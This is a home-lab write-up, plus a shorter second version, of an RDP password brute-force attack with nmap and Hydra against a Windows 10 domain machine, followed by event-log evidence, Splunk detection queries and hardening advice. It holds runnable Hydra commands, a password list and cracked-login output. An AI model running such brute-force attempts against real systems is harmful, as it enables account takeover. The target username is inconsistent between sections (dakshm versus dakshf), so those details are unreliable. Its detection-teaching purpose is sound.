# T1110 — Brute Force Attack

## Technique Overview

| Field              | Details                                                                 |
|--------------------|-------------------------------------------------------------------------|
| **MITRE ID**       | T1110 / T1110.001 (Password Guessing)                                   |
| **Tactic**         | Credential Access → Initial Access                                      |
| **Tool Used**      | Hydra                                                                   |
| **Attacker**       | Kali Linux — `192.168.56.250`                                           |
| **Target**         | Windows 10 (Domain User Machine) — `192.168.56.100`                     |
| **Protocol**       | RDP (port 3389)                                                         |
| **Domain**         | `hettilava.local`                                                       |
| **Target Username**| `dakshm`                                                                |
| **Objective**      | Gain valid domain credentials via repeated RDP password attempts        |

---

## Attack Description

A brute force attack is a trial-and-error method used to obtain valid credentials by systematically
submitting a large number of username/password combinations against an authentication service.

In this scenario, the attacker targets the **RDP service on the Windows 10 domain-joined machine**
using **Hydra** to guess the password of domain user `dakshm`. A successful login produces Event ID
**4624** (Logon Success) after a series of Event ID **4625** (Logon Failure) events — a classic
pattern SOC analysts monitor for.

RDP brute force is particularly significant because:
- RDP (port 3389) is commonly exposed on domain-joined workstations
- A successful RDP login gives the attacker an **interactive desktop session** on the victim machine
- Logon Type **10** (RemoteInteractive) in the event logs distinguishes it from other logon types
- The compromised workstation acts as a **pivot point** to reach the DC at `192.168.56.7`

This maps to MITRE ATT&CK sub-technique **T1110.001 — Password Guessing**.

---

## Lab Environment

```
[Kali Linux]        192.168.56.250
        |
        |  RDP (Port 3389)
        |
[Windows 10 Victim] 192.168.56.100   dakshf@hettilava.local
        |
        |  Domain Member
        |
[Windows Server DC] 192.168.56.7     hettilava.local
        |
        |  Splunk Forwarder
        |
[Ubuntu — Splunk]   192.168.56.10
```

---

## Pre-Attack Recon

Before running Hydra, the attacker confirms the RDP service is open on the victim machine.

```bash
# Verify RDP port is open on the Windows 10 machine
nmap -sV -p 3389 192.168.56.100
```
Expected output:
```
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
```
![Hydra Attack Output](/screenshot/attacks/T1110-brute-force/hydra-pre-check.png)

> **Note:** In this lab, the target username `dakshm` is a known domain user on `hettilava.local`.
> In real engagements the username would be obtained via LDAP enumeration, OSINT, or email harvesting.

---

## Wordlist Preparation

```bash
# Use rockyou as the base wordlist
cp /usr/share/wordlists/rockyou.txt ~/ad-project/passwords.txt

# Optional: create a targeted mini-list for a faster lab demo
cat > ~/lab/custom_pass.txt << EOF
Password1
Password123
Welcome1
Summer2024
Admin@123
P@ssw0rd
hettilava123
dakshf2024
EOF
```

---

## Attack Execution

### Step 1 — Run Hydra against RDP

```bash
hydra -l dakshf -P ~/lab/custom_pass.txt rdp://192.168.56.100 -V -t 4
```

**Flag breakdown:**

| Flag | Meaning |
|------|---------|
| `-l dakshm` | Single username to target |
| `-P custom_pass.txt` | Password list |
| `rdp://192.168.56.100` | Target protocol and IP (Windows 10 victim) |
| `-V` | Verbose — show each attempt |
| `-t 4` | 4 parallel tasks (keep low to avoid lockout) |

![Hydra Attack Output](/screenshot/attacks/T1110-brute-force/hydra-success.png)


> ⚠️ **Lab Note:** If NLA (Network Level Authentication) is enforced on the Windows 10 machine,
> Hydra's RDP module will still negotiate pre-auth and detect valid credentials.
> Use `-t 1` if you encounter connection instability.

---

### Step 2 — Observe Failures Then Success

Hydra prints each attempt in real time. Failed attempts generate Windows Event ID `4625` on both
the victim machine and the DC. A successful match generates Event ID `4624`.

Expected terminal output (failed attempts):
```
[ATTEMPT] target 192.168.56.100 - login "dakshf" - pass "Password1"   - 1 of 8 [child 0]
[ATTEMPT] target 192.168.56.100 - login "dakshf" - pass "Password123" - 2 of 8 [child 1]
```

Expected terminal output (successful crack):
```
[3389][rdp] host: 192.168.56.100   login: dakshf   password: Welcome1
1 valid password found
```

---

---

## What Happens on the Target (Windows 10 + DC)

### Failed Login Attempts — Event ID 4625

Each wrong password generates a **4625** entry on the victim machine:

```
Event ID:       4625
Account Name:   dakshf
Account Domain: HETTILAVA
Failure Reason: Unknown user name or bad password
Logon Type:     10  (RemoteInteractive — RDP)
Source IP:      192.168.56.250
```

### Successful Login — Event ID 4624

When the correct password is found, a **4624** appears immediately after the burst of 4625s:

```
Event ID:       4624
Account Name:   dakshf
Account Domain: HETTILAVA
Logon Type:     10  (RemoteInteractive — RDP)
Source IP:      192.168.56.250
```

> **Key signal:** Logon Type `10` is unique to RDP interactive sessions. This differentiates
> an RDP brute force from a network share login (Type 3) or local console login (Type 2).


---

## Evidence Artifacts

| Artifact | Location | Description |
|----------|----------|-------------|
| Windows Security Log | WIN10 Event Viewer → Security | Event IDs 4625, 4624, 4634 |
| Splunk Indexed Logs | `index=wineventlog` | Forwarded from both WIN10 and DC |
| Hydra terminal output | Kali terminal / screenshot | Shows each attempt and final crack |
| Sysmon Event ID 3 | Network connection log | `192.168.56.250` → `192.168.56.100:3389` |

📂 Screenshots: `screenshot/attacks/T1110-brute-force/`

---

## Attack Timeline

```
T+00s   Attacker runs Hydra against Windows 10 RDP (192.168.56.100:3389)
T+01s   WIN10 logs Event 4625 — dakshf / Password1     [FAIL]
T+02s   WIN10 logs Event 4625 — dakshf / Password123   [FAIL]
T+03s   WIN10 logs Event 4625 — dakshf / Welcome1      [...]
T+03s   WIN10 logs Event 4624 — dakshf / Welcome1      [SUCCESS]  Logon Type 10
T+03s   WIN10 logs Event 4634 — dakshf                 [DISCONNECT — automated]
T+04s   Proceeds to next stage: PowerShell Execution (T1059.001)
```

---

## MITRE ATT&CK Context

```
Initial Access
└── T1110 — Brute Force
    └── T1110.001 — Password Guessing (via RDP)
            ↓
Credential Access → Valid Account (T1078)
        dakshf@hettilava.local  (192.168.56.100)
            ↓
Execution → PowerShell (T1059.001)        [next stage]
            ↓
Persistence → Account Creation (T1136.001)
            ↓
C2 → Reverse Shell
```

The compromised `dakshf` credentials obtained here are reused in every subsequent stage of
the attack chain. The Windows 10 machine at `192.168.56.100` becomes the attacker's foothold
in the `hettilava.local` domain.

---

## Detection Summary

> Full detection logic and Splunk SPL queries are documented in:
> `detection/T1110-Brute-Force/detection.md`

Key detection signals:
- Spike in Event ID **4625** from source IP `192.168.56.250` in a short time window
- All failures show **Logon Type 10** (RDP) targeting user `dakshf`
- Followed by Event ID **4624** (Logon Type 10) from the same IP
- Rapid **4624 → 4634** pair indicating automated session (no real user interaction)
- Source IP `192.168.56.250` is a Kali machine — outside expected domain workstation range
- Sysmon Event ID 3: repeated connections from `192.168.56.250` to `192.168.56.100:3389`

---

## Mitigation & Hardening (Blue Team Notes)

| Control | Description |
|---------|-------------|
| Account Lockout Policy | Lock account after 5 failed attempts (GPO → Account Policies) |
| RDP Firewall Rules | Block port 3389 from non-domain / non-VPN IPs at perimeter |
| NLA Enforcement | Require Network Level Authentication before login screen loads |
| RDP Gateway | Route all RDP through a hardened gateway — not direct workstation exposure |
| Privileged Access Workstations | Restrict which source IPs are allowed to RDP into domain machines |
| MFA on RDP | Require MFA to block credential abuse even when passwords are known |
| Honey Accounts | Create a fake domain user — any RDP attempt to it triggers an alert |

---

## References

- [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/)
- [MITRE ATT&CK T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [Windows Event ID 4625 — Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- [Windows Event ID 4624 — Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)
- [Hydra — THC Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

*This attack was performed in a controlled lab environment for educational purposes only. Domain: `hettilava.local`.*




# ⚔️ Brute Force Attack (T1110)

---

## 🎯 Objective

Simulate a brute force attack against a Windows system using Hydra and detect failed authentication attempts in Splunk.

---

## 🧠 MITRE ATT&CK Mapping

- Technique: T1110  
- Name: Brute Force  

---

## 🛠️ Tools Used

- Kali Linux (Hydra)  
- Windows 10 (Target)  
- Splunk SIEM  

---

## ⚙️ Attack Execution

Run from Kali Linux:

```bash
hydra -l user1 -P rockyou.txt rdp://192.168.56.100
```

---

## 🧩 Steps Performed

1. Open Kali Linux attacker machine  
2. Ensure connectivity to target (192.168.56.100)  
3. Use Hydra with username and password list  
4. Launch brute force attack  
5. Monitor failed login attempts  

---

## 📊 Telemetry Generated

### Windows Security Logs

- Event ID 4625 → Failed Logon  
- Source IP → 192.168.56.250  

---

## 🔍 Detection in Splunk

### Basic Detection

```spl
index=wineventlog EventCode=4625
| stats count by Account_Name, Source_Network_Address
| where count > 10
```

---

### Advanced Detection

```spl
index=wineventlog EventCode=4625
| bucket _time span=1m
| stats count by _time, Account_Name, Source_Network_Address
| where count > 5
```

---

## 🧠 Detection Logic

- Identify multiple failed logins in short time  
- Same source IP targeting same account  
- High frequency authentication failures  

---

## ⚠️ False Positives

- User entering wrong password repeatedly  
- Misconfigured services  

### Mitigation

- Set threshold (e.g., >10 attempts)  
- Exclude service accounts  

---

## 📸 Screenshots Required

- Hydra attack running  
- Windows Event Viewer logs (4625)  
- Splunk detection results  

Paths:

- screenshots/attacks/bruteforce.png  
- screenshots/detections/bruteforce-splunk.png  

---

## 🚀 Outcome

- Successfully simulated brute force attack  
- Generated failed login logs  
- Detected activity using Splunk  

---
